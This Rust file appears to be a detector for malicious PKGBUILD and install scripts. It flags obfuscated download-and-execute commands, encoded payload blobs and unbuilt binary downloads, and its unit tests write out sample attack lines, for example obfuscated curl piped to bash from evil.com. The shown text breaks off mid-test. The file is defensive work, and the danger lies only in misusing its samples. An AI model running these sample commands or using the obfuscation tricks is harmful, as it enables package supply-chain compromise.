use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

/// PKGBUILD standard variables that should not be tracked for obfuscation.
const PKGBUILD_STANDARD_VARS: &[&str] = &[
    "pkgname",
    "pkgver",
    "pkgrel",
    "epoch",
    "pkgdesc",
    "arch",
    "url",
    "license",
    "groups",
    "depends",
    "makedepends",
    "checkdepends",
    "optdepends",
    "provides",
    "conflicts",
    "replaces",
    "backup",
    "options",
    "install",
    "changelog",
    "source",
    "noextract",
    "md5sums",
    "sha1sums",
    "sha224sums",
    "sha256sums",
    "sha384sums",
    "sha512sums",
    "b2sums",
    "validpgpkeys",
    // Common build environment variables
    "CFLAGS",
    "CXXFLAGS",
    "CPPFLAGS",
    "LDFLAGS",
    "GOFLAGS",
    "CGO_CFLAGS",
    "CGO_CPPFLAGS",
    "CGO_CXXFLAGS",
    "CGO_LDFLAGS",
    "MAKEFLAGS",
    // PKGBUILD special variables
    "srcdir",
    "pkgdir",
    "startdir",
];

/// Commands that indicate malicious intent when reconstructed via obfuscation.
const DANGEROUS_COMMANDS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "bash", "sh", "python", "python3", "python2", "perl", "ruby",
    "php", "lua", "socat", "telnet",
];

/// Download-and-execute compound patterns: (downloader, executor).
const DANGEROUS_PIPES: &[(&str, &str)] = &[
    ("curl", "bash"),
    ("curl", "sh"),
    ("curl", "python"),
    ("curl", "python3"),
    ("wget", "bash"),
    ("wget", "sh"),
    ("wget", "python"),
    ("wget", "python3"),
];

/// Build tool commands whose presence indicates legitimate compilation.
const BUILD_COMMANDS: &[&str] = &[
    "make",
    "cmake",
    "cargo",
    "gcc",
    "g++",
    "go build",
    "go install",
    "rustc",
    "javac",
    "mvn",
    "gradle",
    "meson",
    "ninja",
    "configure",
    "python setup.py",
    "pip install",
    "npm run build",
    "yarn build",
    "qmake",
    "scons",
    "waf",
];

// --- Regexes (compiled once) ---

/// Matches simple variable assignments: VAR=value, VAR="value", VAR='value'
/// Also handles semicolon-separated: a=cu;b=rl
static ASSIGN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:^|;)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^;"'\s]*))"#).unwrap()
});

/// Matches variable references: $VAR or ${VAR}
static VAR_REF_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?").unwrap());

/// Matches $(printf '\xNN') or $(printf '\NNN') subshells
static PRINTF_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\$\(\s*printf\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#).unwrap()
});

/// Matches $(echo -e '\xNN') subshells
static ECHO_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\$\(\s*echo\s+-[neE]+\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#).unwrap()
});

/// Long hex string (129+ hex chars; 128 = SHA-512, so 129+ avoids checksum FPs)
static LONG_HEX_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[0-9a-fA-F]{129,}").unwrap());

/// Checksum array line (declaration)
static CHECKSUM_LINE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(md5|sha\d+|b2)sums").unwrap());

/// Checksum array opening: sha256sums=( or sha256sums_x86_64=(
static CHECKSUM_ARRAY_OPEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(md5|sha\d+|b2)sums(_[a-zA-Z0-9_]+)?\s*=\s*\(").unwrap());

/// Long base64 string (100+ chars of base64 alphabet)
static LONG_BASE64_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{100,}={0,3}").unwrap());

/// Heredoc start with shell quote/escape fragments preserved for quote removal:
/// `<<EOF`, `<<'EOF'`, `<<\EOF`, `<<E"OF"`, and `<<-EOF`.
static HEREDOC_START_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(<<-?)[ \t]*((?:\\.|'[^']*'|"[^"]*"|[A-Za-z0-9_.-])+)(?:[ \t]|$|[;&|<>#])"#)
        .unwrap()
});

/// A high-entropy heredoc is only actionable when its bytes flow directly into
/// an interpreter or decoder. Plain `cat <<EOF` is commonly used to generate
/// legitimate wrapper scripts and configuration files.
static HEREDOC_DIRECT_SINK_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(?:^|[|;&]\s*)(?:bash|sh|python[23]?|perl|ruby|php|lua|node|eval|base64\b[^|;&]*(?:-d|--decode)|base32\b[^|;&]*(?:-d|--decode)|xxd\b[^|;&]*-r|openssl\b[^|;&]*(?:-d|enc\s+-d))\b[^#\n]*<<|<<[^#\n]*\|\s*(?:bash|sh|python[23]?|perl|ruby|php|lua|node)\b",
    )
    .unwrap()
});

/// Download to file: curl -o, curl -O, wget -O, curl ... > file
static DOWNLOAD_TO_FILE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(curl\s+.*-[oO]\s|wget\s+.*-O\s|curl\s+.*>\s)").unwrap());

/// chmod +x
static CHMOD_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"chmod\s+\+x\s").unwrap());

// --- Feature ---

pub struct ShellAnalysis;

impl Feature for ShellAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let mut signals = Vec::new();

        if let Some(ref content) = ctx.pkgbuild_content {
            signals.extend(analyze_content(content, "", ""));
        }
        if let Some(ref content) = ctx.install_script_content {
            signals.extend(analyze_content(content, "IS-", "(in install script)"));
        }

        signals
    }
}

fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
    let mut signals = analyze_ordered_variable_usage(content);
    signals.extend(analyze_charbychar_construction(content));
    signals.extend(analyze_data_blobs(content));
    signals.extend(analyze_binary_download(content));
    signals.extend(analyze_obfuscated_download_execute(content));

    if !id_prefix.is_empty() {
        for sig in &mut signals {
            sig.id = format!("{}{}", id_prefix, sig.id);
            sig.description = format!("{} {}", sig.description, desc_suffix);
        }
    }

    signals
}

/// Detect shell-equivalent command words hidden by adjacent quotes or escapes,
/// such as `cu""rl ... | ba""sh`.
fn analyze_obfuscated_download_execute(content: &str) -> Vec<Signal> {
    let Some(finding) = crate::shared::shell_syntax::find_obfuscated_download_execute(content)
    else {
        return Vec::new();
    };

    vec![Signal {
        id: "SA-QUOTED-DOWNLOAD-EXEC".to_string(),
        category: SignalCategory::Pkgbuild,
        points: 90,
        description: format!(
            "shell quoting reconstructs download-and-execute pipeline '{}|{}' (line {})",
            finding.downloader, finding.executor, finding.line
        ),
        is_override_gate: true,
        matched_line: content
            .lines()
            .nth(finding.line.saturating_sub(1))
            .map(|line| line.trim().to_string()),
        min_tier: None,
    }]
}

// --- Helpers ---

/// Analyze uses against the variable state that exists at that point in the
/// file. A later benign reassignment must never retroactively rewrite an
/// earlier executable command.
fn analyze_ordered_variable_usage(content: &str) -> Vec<Signal> {
    let standard: HashSet<&str> = PKGBUILD_STANDARD_VARS.iter().copied().collect();
    let mut env = HashMap::new();
    let mut signals = Vec::new();
    let mut found_exec = false;
    let mut found_cmd = false;
    let mut found_indirect = false;

    for (line_index, line) in content.lines().enumerate() {
        let mut cursor = 0usize;
        for caps in ASSIGN_RE.captures_iter(line) {
            let assignment = caps.get(0).expect("assignment regex has a full match");
            analyze_variable_segment(
                &line[cursor..assignment.start()],
                line,
                line_index + 1,
                &env,
                &mut found_exec,
                &mut found_cmd,
                &mut found_indirect,
                &mut signals,
            );

            let name = &caps[1];
            if !standard.contains(name) {
                // Value is in group 2 (double-quoted), 3 (single-quoted), or 4
                // (unquoted). Keep the existing single-pass substitution
                // behavior while applying each value only after its assignment.
                let value = caps
                    .get(2)
                    .or_else(|| caps.get(3))
                    .or_else(|| caps.get(4))
                    .map(|m| m.as_str())
                    .unwrap_or("");
                env.insert(name.to_string(), value.to_string());
            }
            cursor = assignment.end();
        }
        analyze_variable_segment(
            &line[cursor..],
            line,
            line_index + 1,
            &env,
            &mut found_exec,
            &mut found_cmd,
            &mut found_indirect,
            &mut signals,
        );
    }

    signals
}

/// Substitute $VAR and ${VAR} references with known values from the environment.
fn resolve_variables(line: &str, env: &HashMap<String, String>) -> String {
    VAR_REF_RE
        .replace_all(line, |caps: &regex::Captures| {
            let name = &caps[1];
            env.get(name)
                .cloned()
                .unwrap_or_else(|| caps[0].to_string())
        })
        .to_string()
}

/// Check if a resolved line contains a download-and-execute pipe pattern.
fn contains_dangerous_pipe(resolved: &str) -> Option<(&'static str, &'static str)> {
    let lower = resolved.to_lowercase();
    if !lower.contains('|') {
        return None;
    }
    let parts: Vec<&str> = lower.split('|').collect();
    for i in 0..parts.len() - 1 {
        let left = parts[i].trim();
        let right = parts[i + 1].trim();
        for &(dl, exec) in DANGEROUS_PIPES {
            if left.contains(dl) && right.contains(exec) {
                return Some((dl, exec));
            }
        }
    }
    None
}

/// Whether a byte is a shell word character (alphanumeric or underscore).
fn is_word_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Check if `word` appears in `text` at a word boundary (not as a substring of a larger token).
fn has_word_match(text: &str, word: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = text[start..].find(word) {
        let abs_pos = start + pos;
        let before_ok = abs_pos == 0 || !is_word_char(text.as_bytes()[abs_pos - 1]);
        let end_pos = abs_pos + word.len();
        let after_ok = end_pos >= text.len() || !is_word_char(text.as_bytes()[end_pos]);
        if before_ok && after_ok {
            return true;
        }
        start = abs_pos + 1;
    }
    false
}

/// Check if a resolved line contains a dangerous command assembled from multiple variables.
/// Returns None if a single variable already holds the command (SA-INDIRECT-EXEC covers that).
fn contains_multi_var_dangerous_cmd(
    original: &str,
    resolved: &str,
    env: &HashMap<String, String>,
) -> Option<&'static str> {
    let orig_lower = original.to_lowercase();
    let res_lower = resolved.to_lowercase();
    DANGEROUS_COMMANDS
        .iter()
        .find(|&&cmd| {
            if !has_word_match(&res_lower, cmd) || has_word_match(&orig_lower, cmd) {
                return false;
            }
            // Skip if any single variable already holds this command —
            // SA-INDIRECT-EXEC handles that case with execution-position checking.
            let single_var_holds_it = env.values().any(|v| has_word_match(&v.to_lowercase(), cmd));
            !single_var_holds_it
        })
        .copied()
}

// --- Sub-Analyzers ---

#[allow(clippy::too_many_arguments)]
fn analyze_variable_segment(
    segment: &str,
    display_line: &str,
    line_number: usize,
    env: &HashMap<String, String>,
    found_exec: &mut bool,
    found_cmd: &mut bool,
    found_indirect: &mut bool,
    signals: &mut Vec<Signal>,
) {
    if segment.contains('$') {
        let resolved = resolve_variables(segment, env);

        if !*found_exec
            && resolved != segment
            && let Some((dl, exec)) = contains_dangerous_pipe(&resolved)
        {
            let original = segment.to_lowercase();
            if !(original.contains(dl) && original.contains(exec)) {
                signals.push(Signal {
                    id: "SA-VAR-CONCAT-EXEC".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 85,
                    description: format!(
                        "variable concatenation resolves to '{}|{}' (line {})",
                        dl, exec, line_number
                    ),
                    is_override_gate: true,
                    matched_line: Some(display_line.trim().to_string()),
                    min_tier: None,
                });
                *found_exec = true;
            }
        }

        if !*found_cmd
            && resolved != segment
            && let Some(cmd) = contains_multi_var_dangerous_cmd(segment, &resolved, env)
        {
            signals.push(Signal {
                id: "SA-VAR-CONCAT-CMD".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 55,
                description: format!(
                    "variable concatenation resolves to '{}' (line {})",
                    cmd, line_number
                ),
                is_override_gate: false,
                matched_line: Some(display_line.trim().to_string()),
                min_tier: None,
            });
            *found_cmd = true;
        }
    }

    if *found_indirect {
        return;
    }
    for (var_name, value) in env {
        let lower = value.to_lowercase();
        let Some(cmd) = DANGEROUS_COMMANDS
            .iter()
            .find(|&&cmd| lower == cmd)
            .copied()
        else {
            continue;
        };
        let pattern = format!(
            r"(?m)(?:^|\||\|\||&&|;)\s*\$\{{?{}\}}?",
            regex::escape(var_name)
        );
        if let Ok(re) = Regex::new(&pattern)
            && re.is_match(segment)
        {
            signals.push(Signal {
                id: "SA-INDIRECT-EXEC".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 70,
                description: format!(
                    "variable ${} holds '{}' and is used in execution position",
                    var_name, cmd
                ),
                is_override_gate: false,
                matched_line: Some(display_line.trim().to_string()),
                min_tier: None,
            });
            *found_indirect = true;
            break;
        }
    }
}

/// Detect char-by-char command construction via printf/echo subshells.
fn analyze_charbychar_construction(content: &str) -> Vec<Signal> {
    for (i, line) in content.lines().enumerate() {
        let printf_count = PRINTF_SUBSHELL_RE.find_iter(line).count();
        let echo_count = ECHO_SUBSHELL_RE.find_iter(line).count();
        let total = printf_count + echo_count;
        if total >= 3 {
            return vec![Signal {
                id: "SA-CHARBYCHAR-CONSTRUCT".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 75,
                description: format!(
                    "{} printf/echo subshells on line {} (char-by-char command construction)",
                    total,
                    i + 1
                ),
                is_override_gate: false,
                matched_line: Some(line.trim().to_string()),
                min_tier: None,
            }];
        }
    }
    Vec::new()
}

/// Detect suspiciously encoded data blobs.
fn analyze_data_blobs(content: &str) -> Vec<Signal> {
    let mut signals = Vec::new();

    let mut in_checksum_block = false;

    for line in content.lines() {
        // Track whether we're inside a checksum array block
        if CHECKSUM_ARRAY_OPEN_RE.is_match(line) {
            in_checksum_block = true;
        }

        // Skip checksum array lines (both declaration and value lines)
        let skip = in_checksum_block || CHECKSUM_LINE_RE.is_match(line);

        if in_checksum_block && line.contains(')') {
            in_checksum_block = false;
        }

        if skip {
            continue;
        }

        // Long hex strings
        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-HEX") && LONG_HEX_RE.is_match(line)
        {
            signals.push(Signal {
                id: "SA-DATA-BLOB-HEX".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 50,
                description: "embedded long hex string (possible encoded payload)".to_string(),
                is_override_gate: false,
                matched_line: Some(line.trim().to_string()),
                min_tier: None,
            });
        }

        // Long base64 strings
        if signals
            .iter()
            .all(|s: &Signal| s.id != "SA-DATA-BLOB-BASE64")
            && LONG_BASE64_RE.is_match(line)
        {
            // Avoid flagging lines that also match hex (already caught above)
            if !LONG_HEX_RE.is_match(line) {
                signals.push(Signal {
                    id: "SA-DATA-BLOB-BASE64".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 50,
                    description: "embedded long base64 string (possible encoded payload)"
                        .to_string(),
                    is_override_gate: false,
                    matched_line: Some(line.trim().to_string()),
                    min_tier: None,
                });
            }
        }
    }

    // Heredoc entropy analysis
    signals.extend(analyze_heredoc_entropy(content));

    signals
}

/// Detect high-entropy heredoc bodies.
fn analyze_heredoc_entropy(content: &str) -> Vec<Signal> {
    let lines: Vec<&str> = content.lines().collect();
    let mut i = 0;

    while i < lines.len() {
        if HEREDOC_DIRECT_SINK_RE.is_match(lines[i])
            && let Some(caps) = HEREDOC_START_RE.captures(lines[i])
        {
            let start_line = lines[i];
            let strip_tabs = &caps[1] == "<<-";
            let delimiter = quote_removed_heredoc_word(&caps[2]);
            let mut body = String::new();
            i += 1;
            while i < lines.len() {
                let candidate = if strip_tabs {
                    lines[i].trim_start_matches('\t')
                } else {
                    lines[i]
                };
                if candidate == delimiter {
                    break;
                }
                body.push_str(lines[i]);
                body.push('\n');
                i += 1;
            }

            if body.len() > 200 {
                let entropy = shannon_entropy(&body);
                if entropy > 5.0 {
                    return vec![Signal {
                        id: "SA-HIGH-ENTROPY-HEREDOC".to_string(),
                        category: SignalCategory::Pkgbuild,
                        points: 55,
                        description: format!(
                            "heredoc with high entropy ({:.1} bits/byte, {} bytes)",
                            entropy,
                            body.len()
                        ),
                        is_override_gate: false,
                        matched_line: Some(start_line.trim().to_string()),
                        min_tier: None,
                    }];
                }
            }
        }
        i += 1;
    }

    Vec::new()
}

fn quote_removed_heredoc_word(word: &str) -> String {
    let mut delimiter = String::with_capacity(word.len());
    let mut quote = None;
    let mut escaped = false;

    for character in word.chars() {
        if escaped {
            delimiter.push(character);
            escaped = false;
            continue;
        }
        if let Some(quote_character) = quote {
            if character == quote_character {
                quote = None;
            } else if character == '\\' && quote_character == '"' {
                escaped = true;
            } else {
                delimiter.push(character);
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '\\' => escaped = true,
            _ => delimiter.push(character),
        }
    }

    delimiter
}

/// Calculate Shannon entropy in bits per byte.
fn shannon_entropy(s: &str) -> f64 {
    let len = s.len() as f64;
    if len == 0.0 {
        return 0.0;
    }
    let mut freq = HashMap::new();
    for &b in s.as_bytes() {
        *freq.entry(b).or_insert(0usize) += 1;
    }
    freq.values()
        .map(|&count| {
            let p = count as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Detect download + chmod +x without any compilation step.
fn analyze_binary_download(content: &str) -> Vec<Signal> {
    let has_download = DOWNLOAD_TO_FILE_RE.is_match(content);
    let has_chmod_exec = CHMOD_EXEC_RE.is_match(content);

    if !has_download || !has_chmod_exec {
        return Vec::new();
    }

    let has_build_cmd =
        crate::shared::shell_syntax::contains_executable_command(content, BUILD_COMMANDS);

    if has_build_cmd {
        return Vec::new();
    }

    let matched_line = content
        .lines()
        .find(|line| DOWNLOAD_TO_FILE_RE.is_match(line))
        .map(|line| line.trim().to_string());
    vec![Signal {
        id: "SA-BINARY-DOWNLOAD-NOCOMPILE".to_string(),
        category: SignalCategory::Pkgbuild,
        points: 60,
        description: "downloads file and chmod +x with no compilation step".to_string(),
        is_override_gate: false,
        matched_line,
        min_tier: None,
    }]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
        };
        ShellAnalysis
            .analyze(&ctx)
            .iter()
            .map(|s| s.id.clone())
            .collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // --- Variable Resolution ---

    #[test]
    fn var_concat_curl_pipe_bash() {
        let ids = analyze("a=cu\nb=rl\n$a$b http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_semicolon_separated() {
        let ids = analyze("a=cu;b=rl\n$a$b http://evil.com | sh");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_quoted_values() {
        let ids = analyze("cmd=\"cur\"\ncmd2=\"l\"\n$cmd$cmd2 http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_single_quoted() {
        let ids = analyze("a='wg'\nb='et'\n$a$b http://evil.com/payload -O /tmp/p");
        assert!(has(&ids, "SA-VAR-CONCAT-CMD"));
    }

    #[test]
    fn var_concat_wget_pipe() {
        let ids = analyze("x=wg\ny=et\n$x$y -q -O- http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn later_reassignment_cannot_poison_earlier_command() {
        let ids = analyze(
            "first=cu\nsecond=rl\n$first$second https://evil.invalid/payload | bash\nfirst=true\nsecond=true\n",
        );
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn same_line_later_reassignment_cannot_poison_earlier_command() {
        let ids = analyze(
            "first=cu;second=rl\n$first$second https://evil.invalid/payload | bash;first=true;second=true\n",
        );
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn reassignment_before_use_applies_to_later_command() {
        let ids = analyze(
            "first=cu;second=rl\nfirst=true;second=true\n$first$second https://example.invalid/payload | bash\n",
        );
        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn var_concat_benign_no_signal() {
        let ids = analyze("prefix=/usr\ninstall -Dm755 binary ${prefix}/bin/tool");
        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"));
    }

    #[test]
    fn var_concat_single_var_python_no_signal() {
        // Single variable holding "python3" should NOT fire SA-VAR-CONCAT-CMD
        // (SA-INDIRECT-EXEC handles single-variable cases)
        let ids = analyze("_py=python3\n$_py setup.py install");
        assert!(
            !has(&ids, "SA-VAR-CONCAT-CMD"),
            "single var python3 should not fire, got: {ids:?}"
        );
    }

    #[test]
    fn var_concat_single_var_sh_no_signal() {
        let ids = analyze("_shell=sh\n$_shell -c 'echo hello'");
        assert!(
            !has(&ids, "SA-VAR-CONCAT-CMD"),
            "single var sh should not fire, got: {ids:?}"
        );
    }

    #[test]
    fn var_concat_multi_var_still_fires() {
        // Multi-variable concatenation SHOULD still fire
        let ids = analyze("a=cu\nb=rl\n$a$b http://evil.com -O /tmp/x");
        assert!(
            has(&ids, "SA-VAR-CONCAT-CMD"),
            "multi-var concat should fire, got: {ids:?}"
        );
    }

    #[test]
    fn var_concat_word_boundary_no_substring() {
        // "_fisher=fisher" should NOT match "sh" as a substring
        let ids = analyze("_fisher=fisher\necho $_fisher");
        assert!(
            !has(&ids, "SA-VAR-CONCAT-CMD"),
            "fisher should not match sh, got: {ids:?}"
        );
    }

    #[test]
    fn var_concat_standard_vars_ignored() {
        let ids = analyze("pkgname=curl\ninstall -Dm755 $pkgname \"$pkgdir/usr/bin/$pkgname\"");
        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"));
        assert!(!has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn var_concat_already_visible_no_duplicate() {
        // curl is already visible in the original line, should not double-flag
        let ids = analyze("x=foo\ncurl http://example.com | bash");
        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn adjacent_quotes_cannot_hide_curl_pipe_bash() {
        let ids = analyze(r#"cu""rl https://evil.example/payload | ba""sh"#);
        assert!(has(&ids, "SA-QUOTED-DOWNLOAD-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn quoted_pipeline_text_is_not_executable() {
        let ids = analyze(r#"echo "cu''rl https://example.test | ba''sh""#);
        assert!(!has(&ids, "SA-QUOTED-DOWNLOAD-EXEC"), "got: {ids:?}");
    }

    // --- Indirect Execution ---

    #[test]
    fn indirect_exec_pipe_to_var() {
        let ids = analyze("x=bash\necho id | $x");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_var_at_line_start() {
        let ids = analyze("cmd=python3\n$cmd -c 'import os'");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_after_semicolon() {
        let ids = analyze("s=sh\necho test; $s -c 'id'");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_benign_var() {
        let ids = analyze("editor=vim\n$editor file.txt");
        assert!(!has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_braces() {
        let ids = analyze("c=bash\necho payload | ${c}");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    // --- Char-by-Char Construction ---

    #[test]
    fn charbychar_printf_subshells() {
        let ids = analyze(
            r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com",
        );
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_echo_subshells() {
        let ids = analyze(r"$(echo -e '\x62')$(echo -e '\x61')$(echo -e '\x73')$(echo -e '\x68')");
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_mixed_printf_echo() {
        let ids = analyze(r"$(printf '\x63')$(echo -e '\x75')$(printf '\x72')$(printf '\x6c')");
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_two_subshells_no_signal() {
        let ids = analyze(r"$(printf '\x63')$(printf '\x75')rl");
        assert!(!has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    // --- Data Blobs ---

    #[test]
    fn data_blob_long_hex() {
        let hex = "a1".repeat(80); // 160 hex chars
        let ids = analyze(&format!("data=\"{hex}\""));
        assert!(has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn data_blob_checksum_not_flagged() {
        let hex = "a1".repeat(80);
        let ids = analyze(&format!("sha256sums=('{hex}')"));
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn data_blob_long_base64() {
        let b64 = "A".repeat(120);
        let ids = analyze(&format!("payload=\"{b64}\""));
        assert!(has(&ids, "SA-DATA-BLOB-BASE64"));
    }

    #[test]
    fn data_blob_short_hex_no_signal() {
        let hex = "a1b2c3d4e5f6";
        let ids = analyze(&format!("hash=\"{hex}\""));
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn high_entropy_heredoc() {
        // Generate high-entropy content (diverse byte values)
        let body: String = (0..300)
            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
            .collect();
        let ids = analyze(&format!("bash <<EOF\n{body}\nEOF"));
        assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
    }

    #[test]
    fn arithmetic_shift_does_not_mask_later_executable_heredoc() {
        let body: String = (0..300)
            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
            .collect();
        let ids = analyze(&format!("value=$((1 << 2))\nbash <<EOF\n{body}\nEOF"));
        assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
    }

    #[test]
    fn quoted_and_escaped_heredoc_delimiters_are_quote_removed() {
        let body: String = (0..300)
            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
            .collect();
        for declaration in [r#"bash <<E"OF""#, r"bash <<\EOF"] {
            let ids = analyze(&format!("{declaration}\n{body}\nEOF"));
            assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"), "missed {declaration}");
        }
    }

    #[test]
    fn high_entropy_generated_file_without_sink_has_no_signal() {
        let body: String = (0..300)
            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
            .collect();
        let ids = analyze(&format!("cat > wrapper.sh <<'EOF'\n{body}\nEOF"));
        assert!(
            !has(&ids, "SA-HIGH-ENTROPY-HEREDOC"),
            "generated text without a direct execution/decode sink should not trigger: {ids:?}"
        );
    }

    #[test]
    fn low_entropy_heredoc_no_signal() {
        let body = "This is a normal help message.\nPlease run the program.\n".repeat(5);
        let ids = analyze(&format!("cat <<EOF\n{body}\nEOF"));
        assert!(!has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
    }

    // --- Binary Download ---

    #[test]
    fn binary_download_no_build() {
        let ids = analyze("curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool");
        assert!(has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn binary_download_with_make_no_signal() {
        let ids = analyze(
            "curl -o src.tar.gz https://example.com/src.tar.gz\ntar xf src.tar.gz\nmake\nchmod +x output\n",
        );
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn binary_download_with_cargo_no_signal() {
        let ids = analyze(
            "wget -O src.tar.gz https://example.com/src.tar.gz\nchmod +x build.sh\ncargo build\n",
        );
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn inert_build_markers_do_not_suppress_binary_download() {
        for marker in [r#": "make""#, "echo cargo", "# cmake"] {
            let ids = analyze(&format!(
                "curl -o payload https://evil.invalid/payload\nchmod +x payload\n./payload\n{marker}\n"
            ));
            assert!(
                has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"),
                "{marker}: {ids:?}"
            );
        }
    }

    #[test]
    fn wrapped_and_literal_shell_build_commands_suppress_binary_download() {
        for marker in ["env make", r#"bash -c "cargo build""#] {
            let ids = analyze(&format!(
                "curl -o src.tar.gz https://example.invalid/src.tar.gz\nchmod +x output\n{marker}\n"
            ));
            assert!(
                !has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"),
                "{marker}: {ids:?}"
            );
        }
    }

    #[test]
    fn download_without_chmod_no_signal() {
        let ids = analyze("curl -o /tmp/data https://example.com/data.json");
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    // --- Benign PKGBUILD ---

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(
            r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc1')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#,
        );
        assert!(
            ids.is_empty(),
            "benign PKGBUILD should trigger no signals, got: {ids:?}"
        );
    }

    // --- SHA-512 checksum false positive regression ---

    #[test]
    fn data_blob_sha512_not_flagged() {
        let sha512 = "a1".repeat(64); // exactly 128 hex chars = SHA-512
